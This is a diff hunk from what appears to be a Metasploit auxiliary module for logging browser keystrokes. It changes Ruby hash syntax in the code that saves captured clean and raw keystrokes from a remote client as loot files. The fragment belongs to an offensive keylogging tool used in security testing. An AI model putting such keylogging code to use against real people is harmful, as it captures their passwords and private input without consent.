@@ -172,9 +172,9 @@ class Metasploit3 < Msf::Auxiliary
       header << "====================\n\n"
 
       @client_cache[cid] = {
-        :created => Time.now.to_i,
-        :path_clean => store_loot("browser.keystrokes.clean", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Clean)"),
-        :path_raw   => store_loot("browser.keystrokes.raw", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Raw)")
+        created: Time.now.to_i,
+        path_clean: store_loot("browser.keystrokes.clean", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Clean)"),
+        path_raw: store_loot("browser.keystrokes.raw", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Raw)")
       }
       print_good("[#{cid}] Logging clean keystrokes to: #{@client_cache[cid][:path_clean]}")
       print_good("[#{cid}] Logging raw keystrokes to: #{@client_cache[cid][:path_raw]}")
